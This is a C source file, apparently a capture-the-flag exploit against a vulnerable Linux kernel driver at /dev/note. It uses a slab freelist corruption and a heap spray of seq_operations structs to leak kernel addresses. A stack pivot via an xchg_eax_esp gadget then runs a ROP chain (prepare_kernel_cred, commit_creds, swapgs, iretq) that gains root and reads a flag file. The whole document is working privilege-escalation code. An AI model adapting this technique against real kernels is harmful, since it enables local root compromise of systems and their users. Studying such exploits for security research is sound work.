#define _GNU_SOURCE
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>

#define ulong unsigned long
#define ALLOC 0xC12ED001
#define FREE 0xC12ED002
#define EDIT 0xC12ED003
#define SHOW 0xC12ED004

typedef struct _req {
    ulong size;
    char* buf;
} req;

req user_req;
void get_flag(void) {
    printf("[*] Returned to userland\n");
    // char *argv[] = {"/bin/sh", NULL};
    // char *envp[] = {NULL};
    // execve("/bin/sh", argv, envp);
    char flag[0x30] = {0, };
    int flag_fd = open("./flag", 0);
    read(flag_fd, flag, 0x30);
    write(1, flag, 0x30);
}

int note_fd;
ulong kernel_base, kernel_heap;
ulong user_cs, user_ss, user_sp, user_rflags;
ulong user_rip = (ulong) get_flag;
ulong offset_kerheap;
ulong commit_creds = 0x69c10;
ulong prepare_kernel_cred = 0x69e00; 
ulong mov_rdi_rax = 0x21f8fc; // mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff8121f8ed ; pop rbp ; ret
ulong pop_rdi = 0x22dd4b;
ulong iretq = 0x1d5c6;
ulong swapgs = 0x03ef24;
ulong xchg_eax_esp = 0x2ce8f; // xchg eax, esp ; ret

int open_note(void) {
    int fd = open("/dev/note", O_RDWR);
    if (fd < 0 ) {
        puts("Failed to open /dev/note");
        exit(-1);
    } else {
        puts("[!] Opened device");
    }
    return fd;
}

void save_state(void) {
     __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"              // move value of register cs to variable user_cs 
        "mov user_ss, ss;"              // move value of register ss to variable user_ss
        "mov user_sp, rsp;"             // move value of register rsp to variable user_sp
        "pushf;"                        // push flags onto stack (16 bit) 
        "pop user_rflags;"              // pop flags to variable user_rflags
        ".att_syntax;"
    );
    printf("[*] Saved state\n");
}

int add_note(ulong size) {
    user_req.size = size;
    user_req.buf = NULL;
    return ioctl(note_fd, ALLOC, &user_req);
}

int free_note() {
    user_req.size = 0;
    user_req.buf = NULL;
    return ioctl(note_fd, FREE, &user_req);
}

int edit_note(ulong size, char *buf) {
    user_req.size = size;
    user_req.buf = buf;
    return ioctl(note_fd, EDIT, &user_req);
}

int show_note(ulong size, char *buf) {
    user_req.size = size;
    user_req.buf = buf;
    return ioctl(note_fd, SHOW, &user_req);
}


int main(void) {
    save_state();
    note_fd = open_note();

    char *tmp = calloc(1, 0x100);
    memset(tmp, 0x42, 0x20);

    /* spray kernel object 0x20
    struct seq_operations {
	    void * (*start) (struct seq_file *m, loff_t *pos);
	    void (*stop) (struct seq_file *m, void *v);
	    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	    int (*show) (struct seq_file *m, void *v);
    }; 
    heap feng shui so our note locates in 0xfffff~~~~~~00
    free_list: 0xfffff~~~~~~00 -> 0xfffff~~~~~~40 -> 0xfffff~~~~~~80
    */
    for (int i=0;i<0x6;i++) {
        open("/proc/self/stat", O_RDONLY);
    }

    /* 
    open vuln dev (our note will locate in 0xfffff~~~~~~00)
    free_list: 0xfffff~~~~~~40 -> 0xfffff~~~~~~80 -> 0xfffff~~~~~~c0
    */
    add_note(0x20);

    /*
    overflow the NULL byte to the free_list of the next chunk
    free_list: 0xfffff~~~~~~40 -> 0xfffff~~~~~~00 -> 0xfffff~~~~~~c0
    */
    edit_note(0x20, tmp);

    /*
    allocate a seq_operations struct  
    free_list: 0xfffff~~~~~~00 -> 0xfffff~~~~~~c0
    */
    open("/proc/self/stat", O_RDONLY);

    /*
    allocate seq_operations struct again, this time this struct will be stored in our note
    free_list: 0xfffff~~~~~~c0
    */
    int target = open("/proc/self/stat", O_RDONLY);

    // leak
    memset(tmp, 0x0, 0x20);
    ulong leak[4];
    show_note(0x20, tmp);
    memcpy(leak, tmp, 0x20);
    printf("leak[0] : %p\n", leak[0]);
    printf("leak[1] : %p\n", leak[1]);
    printf("leak[2] : %p\n", leak[2]);
    printf("leak[3] : %p\n", leak[3]);
    kernel_base = leak[0] - 0x13be60;
    pop_rdi += kernel_base;
    prepare_kernel_cred += kernel_base;
    commit_creds += kernel_base;
    iretq += kernel_base;
    swapgs += kernel_base;
    xchg_eax_esp += kernel_base;
    mov_rdi_rax += kernel_base;
    printf("kernel base: %p\n", kernel_base);
    printf("pop rdi: %p\n", pop_rdi);
    printf("prepare_kernel_cred: %p\n", prepare_kernel_cred);
    printf("commit_creds: %p\n", commit_creds);
    printf("iretq: %p\n", iretq);
    printf("swapgs: %p\n", swapgs);
    printf("xchg_eax_esp: %p\n", xchg_eax_esp);
    printf("mov_rdi_rax: %p\n", mov_rdi_rax);
    // prepare payload
    ulong rop[20];
    int n = 0;
    rop[n++] = pop_rdi;
    rop[n++] = 0x0;
    rop[n++] = 0x0;
    rop[n++] = prepare_kernel_cred;
    rop[n++] = mov_rdi_rax;
    rop[n++] = 0x4141414141414141;
    rop[n++] = commit_creds;
    rop[n++] = swapgs;
    rop[n++] = 0x4141414141414141;
    rop[n++] = iretq;
    rop[n++] = user_rip;
    rop[n++] = user_cs;
    rop[n++] = user_rflags;
    rop[n++] = user_sp;
    rop[n++] = user_ss;


    ulong trigger[] = {
        xchg_eax_esp,           // start
        // xchg_eax_esp,
        // xchg_eax_esp,
        // xchg_eax_esp
        0x4343434343434343,     // stop
        0x4444444444444444,     // next
        0x4545454545454545,     // show

    };

    // prepare a page to put rop chain in userland
    ulong *stack = mmap(xchg_eax_esp&0xfffff000, 0x5000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    printf("[*] fake stack : 0x%llx\n", stack);
    // put rop chain to xchg_eax_esp & 0xffffffff (32 bit)
    memcpy(xchg_eax_esp&0xffffffff, rop, sizeof(rop));

    edit_note(0x20, trigger);
    
    /* 
    read seq_operator will trigger function pointer "start" in seq_operators struct
    at this time, RAX will have the same value as pointer "start" (our RIP)
    the trick is overflow pointer "start" with xchg_eax_esp gadget
    because in this case smap is off => we can put rop chain at address = xchg_eax_esp & 0xffffffff in userland
    xchg_eax_esp will set value of eax (xchg_eax_esp address at that time) to esp => stack pivot to xchg_eax_esp & 0xffffffff
    rop go brr brr  
    */
    read(target, tmp, 1);
    return 0;
}


/*
sadly this exploit doesnt stable :(
because we corrupted free_list, it cant call function like system to get shell, we can only read flag which is enough for a ctf challenge

ps: will try to pop shell next time
*/